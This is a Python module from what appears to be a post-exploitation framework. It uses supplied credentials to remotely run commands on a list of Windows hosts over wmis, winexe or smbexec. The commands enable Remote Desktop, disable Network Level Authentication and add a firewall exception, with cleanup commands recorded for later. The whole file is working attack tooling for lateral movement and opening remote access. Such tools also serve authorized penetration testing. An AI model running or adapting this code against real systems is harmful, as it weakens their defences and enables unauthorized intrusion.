"""

Issues three commands in dependent sequence, i.e. fails to continue
if any command fails.

command 1 - enables RDP on the host
command 2 - disables NLA on the host
command 3 - enables a firewall exception for RDP

Thanks @mubix! taken from p.44 on
http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607


Module built by @harmj0y

"""

from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Enable RDP"
        self.description = "Enables RDP on a host or host list."
        
        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method" : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"]}

    def run(self):

        # assume single set of credentials (take the first one)
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
            
        # enable RDP command
        rdpCMD = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"

        # cleanup RDP command
        rdpCleanupCMD = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f"

        # Disable NLA command
        nlaCMD = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f"

        # Firewall exception command
        firewallCMD = "netsh firewall set service type = remotedesktop mod = enable"


        for target in self.targets:

            # execute the RDP enable command and get the result
            rdpResult = command_methods.executeResult(target, username, password, rdpCMD, triggerMethod)

            if rdpResult == "":
                self.output += "[!] No result file, RDP enable failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "The operation completed successfully" in rdpResult:

                self.output += "[*] RDP successfully enabled using creds '"+username+":"+password+"' on : " + target + "\n"
                # our cleanup is to execute the RDP disable command
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+rdpCleanupCMD+"|"+triggerMethod+"\n"
                
                # if we succeed here, keep going...

                # execute the disable NLA command
                nlaResult = command_methods.executeResult(target, username, password, nlaCMD, triggerMethod)
                if nlaResult == "":
                    self.output += "[!] No result file, NLA disable failed using creds '"+username+":"+password+"' on : " + target + "\n"
                elif "The operation completed successfully" in nlaResult:
                    self.output += "[*] NLA successfully disabled using creds '"+username+":"+password+"' on : " + target + "\n" 

                    # more success, keep going again...

                    # execute the firewall exception command
                    firewallResult = command_methods.executeResult(target, username, password, firewallCMD, triggerMethod)

                    if firewallResult == "":
                        self.output += "[!] No result file, firewall exeception failed using creds '"+username+":"+password+"' on : " + target + "\n"
                    elif "executed successfully" in firewallResult:
                        self.output += "[*] Firewall exception successfully enabled using creds '"+username+":"+password+"' on : " + target + "\n" 
                    else:
                        self.output += "[!] Error in enabling firewall exception using creds '"+username+":"+password+"' on : " + target + "\n"

                else:
                    self.output += "[!] Error in disabling NLA using creds '"+username+":"+password+"' on : " + target + "\n"

            else:
                self.output += "[!] Error in enabling RDP using creds '"+username+":"+password+"' on : " + target + "\n"


